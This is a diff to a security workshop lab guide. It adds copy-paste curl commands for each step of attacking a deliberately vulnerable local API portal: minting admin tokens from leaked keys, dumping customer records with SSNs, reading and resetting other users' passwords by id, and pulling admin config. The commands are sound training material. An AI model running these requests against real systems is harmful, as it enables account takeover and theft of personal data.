@@ -244,6 +244,9 @@
   .prereq-box > strong { color: #1D4ED8; display: block; margin-bottom: 4px; }
   .prereq-box ul { margin: 4px 0 0 16px; padding: 0; }
   .prereq-box li { margin-bottom: 3px; }
+  .prereq-box a { color: #1D4ED8; font-weight: bold; }
+  .curl-label { font-size: 8pt; color: #059669; font-weight: bold; margin: 8px 0 2px 0; text-transform: uppercase; letter-spacing: 0.6px; }
+  pre.curl { border-left: 3px solid #22C55E; }
 </style>
 </head>
 <body>
@@ -282,7 +285,7 @@
   <strong>Prerequisites — install these BEFORE the session (con wifi is unreliable)</strong>
   <ul>
     <li><strong>Node.js 18+ and npm</strong> — runs the lab. Check with <code>node -v</code>; install from <code>nodejs.org</code>.</li>
-    <li><strong>Burp Suite Community Edition</strong> (free) — <code>portswigger.net/burp/communitydownload</code>. You send the raw HTTP requests in every step from Burp Repeater.</li>
+    <li><strong>Burp Suite Community Edition</strong> (free) — download &amp; install from <a href="https://portswigger.net/burp/communitydownload">portswigger.net/burp/communitydownload</a>. You send the raw HTTP requests from Burp Repeater. <em>No Burp? Every step also has a copy-paste <code>curl</code> command below — a terminal is all you need.</em></li>
     <li><strong>Git</strong> — to clone the repo.</li>
     <li><strong>Python 3</strong> — runs the bundled <code>crack.py</code> / <code>decrypt.py</code> (ships on macOS/Linux; on Windows use python.org or WSL). No <code>pip install</code> needed.</li>
     <li><strong>A modern browser with DevTools</strong> — Chrome, Firefox, or Safari.</li>
@@ -385,7 +388,12 @@ var APIM_CONFIG = {
 
 <h3><span class="step">2.3</span>Mint an access token — Burp Repeater</h3>
 
-<div class="warn-box"><strong>Burp gotcha — set <code>Content-Type: application/json</code> on every request that has a body.</strong> The server only parses JSON bodies. When you type a body into Repeater, Burp often auto-adds <code>Content-Type: application/x-www-form-urlencoded</code> instead — the server then ignores your body and you get a confusing <strong>400</strong> (e.g. "New password must be at least 6 characters" even when it's 10). Fix the header to <code>application/json</code> and resend. This applies to steps 2.3, 2.8, 3.3, and 4.3.</div>
+<div class="callout tool">
+  <strong>Two ways to send every request — pick your track</strong>
+  <p style="margin:4px 0 0 0;"><strong>Burp Repeater</strong> (the raw request shown in each step) or <strong>curl</strong> (a copy-paste block right under it — no Burp needed). The curl track uses two shell variables: this first step sets <code>$TOKEN</code> (your access token) and <code>$SUB</code> (the subscription key); later steps reuse them. Paste the commands into <em>one terminal, in order</em>, and the variables carry through.</p>
+</div>
+
+<div class="warn-box"><strong>Burp gotcha — set <code>Content-Type: application/json</code> on every request that has a body.</strong> The server only parses JSON bodies. When you type a body into Repeater, Burp often auto-adds <code>Content-Type: application/x-www-form-urlencoded</code> instead — the server then ignores your body and you get a confusing <strong>400</strong> (e.g. "New password must be at least 6 characters" even when it's 10). Fix the header to <code>application/json</code> and resend. This applies to steps 2.3, 2.8, 3.3, and 4.3. <em>(curl users: the curl blocks already set this header correctly.)</em></div>
 
 <p>The portal's local backend mimics the Azure APIM token-exchange flow. POST the three Azure AD values as headers, the server returns a real Bearer token plus an echoed <code>resource_key</code>.</p>
 
@@ -397,6 +405,16 @@ appKey:       Ins~K3y.qX7vN9bM4dZ8mP2hT5wL1eC6rJ0aFgYi==
 resourceKey:  R7vN3kQ9pX5tL2cD8fG6hJ1mB4sY0aW7eK3rT9zU1nM5oI8jH2vC6bF4yE7wQ0pA==
 
 {}</pre>
+
+<div class="curl-label">curl — copy &amp; paste (no Burp needed):</div>
+<pre class="wrapb curl">SUB=a1b2c3d4e5f6789012345678901234ab
+TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/generate-token \
+  -H 'Content-Type: application/json' \
+  -H 'appId: 8f4e2d1c-9b3a-4f6e-8a7d-2c1b9e5f4a3d' \
+  -H 'appKey: Ins~K3y.qX7vN9bM4dZ8mP2hT5wL1eC6rJ0aFgYi==' \
+  -H 'resourceKey: R7vN3kQ9pX5tL2cD8fG6hJ1mB4sY0aW7eK3rT9zU1nM5oI8jH2vC6bF4yE7wQ0pA==' \
+  -d '{}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
+echo "$TOKEN"    # your admin Bearer token, reused by every step below</pre>
 
 <p><strong>Expected response (200 OK):</strong></p>
 
@@ -419,6 +437,15 @@ Host: localhost:3000
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s http://localhost:3000/api/users \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Ocp-Apim-Subscription-Key: $SUB" \
+  | python3 -c "import sys,json;d=json.load(sys.stdin);print(len(d['users']),'records; first record:',d['users'][0])"
+
+# negative check — drop the sub-key, get 401:
+curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/api/users -H "Authorization: Bearer $TOKEN"</pre>
+
 <p><strong>Expected response:</strong> 4,999 customer records. For each customer: <code>id</code>, <code>name</code>, <code>email</code>, <code>dob</code>, <code>phone</code>, <code>ssn</code>, <code>address</code>, plus a <code>passwordHash</code> and <code>salt</code> (steps 2.6 &ndash; 2.8 use these).</p>
 
 <p><strong>Quick negative check.</strong> Drop either header and resend — the server returns <strong>401</strong> in both cases. That's the gateway requiring both credentials to be valid.</p>
@@ -429,6 +456,10 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 Host: localhost:3000
 Authorization: Bearer eyJhbGc...
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s http://localhost:3000/api/stats \
+  -H "Authorization: Bearer $TOKEN" -H "Ocp-Apim-Subscription-Key: $SUB"</pre>
 
 <p><strong>Expected response:</strong></p>
 
@@ -478,6 +509,11 @@ Host: localhost:3000
 Content-Type: application/json
 
 {"email":"james.mitchell@gmail.com","password":"Pass@1234"}</pre>
+
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s -X POST http://localhost:3000/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"james.mitchell@gmail.com","password":"Pass@1234"}'</pre>
 
 <p><strong>Expected response:</strong></p>
 
@@ -561,6 +597,15 @@ resourceKey:  AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==
 
 {}</pre>
 
+<div class="curl-label">curl — copy &amp; paste (sets <code>$STOK</code>, the superadmin token):</div>
+<pre class="wrapb curl">STOK=$(curl -s -X POST http://localhost:3000/api/auth/generate-token \
+  -H 'Content-Type: application/json' \
+  -H 'appId: 9a8b7c6d-5e4f-3a2b-1c0d-ef9876543210' \
+  -H 'appKey: AdmIn~App.Q4-2024.7vR3xW5tY1uO4sD6jF~AcmePortal' \
+  -H 'resourceKey: AdminRes.K3y.aB2cD3fG4hJ5kL6mN7oP8qR9sT0u1vW==' \
+  -d '{}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
+echo "$STOK"</pre>
+
 <p><strong>Expected response:</strong></p>
 
 <pre>{
@@ -589,6 +634,15 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 Host: localhost:3000
 Authorization: Bearer &lt;superadmin token from step 3.3&gt;
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<div class="curl-label">curl — copy &amp; paste (public token &rarr; 403, then superadmin &rarr; 200):</div>
+<pre class="wrapb curl"># public token from step 2.3 is rejected:
+curl -s -o /dev/null -w "public token -> %{http_code}\n" http://localhost:3000/api/admin/internal-config \
+  -H "Authorization: Bearer $TOKEN" -H "Ocp-Apim-Subscription-Key: $SUB"
+
+# superadmin token from step 3.3 gets the prod config:
+curl -s http://localhost:3000/api/admin/internal-config \
+  -H "Authorization: Bearer $STOK" -H "Ocp-Apim-Subscription-Key: $SUB"</pre>
 
 <p><strong>Expected response (200 OK):</strong></p>
 
@@ -620,6 +674,11 @@ Content-Type: application/json
 
 {"email":"admin@acme-portal.com","password":"InsecureShield@2024"}</pre>
 
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s -X POST http://localhost:3000/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"admin@acme-portal.com","password":"InsecureShield@2024"}'</pre>
+
 <p><strong>Expected response:</strong></p>
 
 <pre>{"IsSuccess":true,"token":"eyJhbGc...","role":"admin","name":"Admin User"}</pre>
@@ -632,7 +691,7 @@ Content-Type: application/json
 
 <h2><span class="num">4</span>Extra credit — bonus attack primitives</h2>
 
-<p>The two chains are the headline. But once you hold a valid Bearer token and the APIM subscription key, the same portal hands you four more textbook flaws. These are the workshop "fast finisher" tasks — each is a single Repeater request. Every request below needs <em>both</em> the <code>Authorization: Bearer</code> header (any token from step 2.3) and the <code>Ocp-Apim-Subscription-Key</code>, exactly like the data APIs.</p>
+<p>The two chains are the headline. But once you hold a valid Bearer token and the APIM subscription key, the same portal hands you four more textbook flaws. These are the workshop "fast finisher" tasks — each is a single Repeater request (or curl one-liner). Every request below needs <em>both</em> the <code>Authorization: Bearer</code> header (<code>$TOKEN</code> from step 2.3) and the <code>Ocp-Apim-Subscription-Key</code> (<code>$SUB</code>), exactly like the data APIs.</p>
 
 <div class="callout find">
   <strong>Where these parameters come from — you're not guessing</strong>
@@ -650,6 +709,10 @@ Content-Type: application/json
 Host: localhost:3000
 Authorization: Bearer eyJhbGc...
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s "http://localhost:3000/api/profile/password?id=1" \
+  -H "Authorization: Bearer $TOKEN" -H "Ocp-Apim-Subscription-Key: $SUB"</pre>
 
 <p><strong>Expected response:</strong></p>
 
@@ -673,6 +736,10 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 Host: localhost:3000
 Authorization: Bearer eyJhbGc...
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
+
+<div class="curl-label">curl — copy &amp; paste (increment id to walk the customer base):</div>
+<pre class="wrapb curl">curl -s "http://localhost:3000/api/profile?id=2" \
+  -H "Authorization: Bearer $TOKEN" -H "Ocp-Apim-Subscription-Key: $SUB"</pre>
 
 <p><strong>Expected response:</strong></p>
 
@@ -703,6 +770,12 @@ Content-Type: application/json
 
 {"id":4,"newPassword":"Owned#2026"}</pre>
 
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s -X PUT http://localhost:3000/api/profile/password \
+  -H "Authorization: Bearer $TOKEN" -H "Ocp-Apim-Subscription-Key: $SUB" \
+  -H 'Content-Type: application/json' \
+  -d '{"id":4,"newPassword":"Owned#2026"}'</pre>
+
 <p><strong>Expected response:</strong></p>
 
 <pre>{"message":"Password updated","userId":"CUST-004"}</pre>
@@ -716,6 +789,11 @@ Host: localhost:3000
 Content-Type: application/json
 
 {"email":"emily.davis@gmail.com","password":"Owned#2026"}</pre>
+
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s -X POST http://localhost:3000/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"emily.davis@gmail.com","password":"Owned#2026"}'</pre>
 
 <pre>{
   "IsSuccess":  true,
@@ -741,6 +819,12 @@ Content-Type: application/json
 
 {"userProfileID":3}</pre>
 
+<div class="curl-label">curl — copy &amp; paste:</div>
+<pre class="wrapb curl">curl -s -X POST http://localhost:3000/api/account/info \
+  -H "Authorization: Bearer $TOKEN" -H "Ocp-Apim-Subscription-Key: $SUB" \
+  -H 'Content-Type: application/json' \
+  -d '{"userProfileID":3}'</pre>
+
 <pre>{
   "IsSuccess":     true,
   "userProfileID": 3,
@@ -757,6 +841,13 @@ Content-Type: application/json
 Host: localhost:3000
 Upgrade: websocket
 Connection: Upgrade</pre>
+
+<div class="curl-label">no Burp? copy &amp; paste (curl can't speak WebSocket — use Node or websocat):</div>
+<pre class="wrapb curl"># Node one-liner — run from the cloned repo dir (the ws module ships in node_modules):
+node -e "const W=require('ws');const w=new W('ws://localhost:3000/ws/notifications?token=demo');w.on('message',m=>{console.log(m.toString());process.exit(0)})"
+
+# or with websocat (brew install websocat):
+echo | websocat "ws://localhost:3000/ws/notifications?token=demo"</pre>
 
 <p><strong>First frame the server sends (unprompted):</strong></p>
 
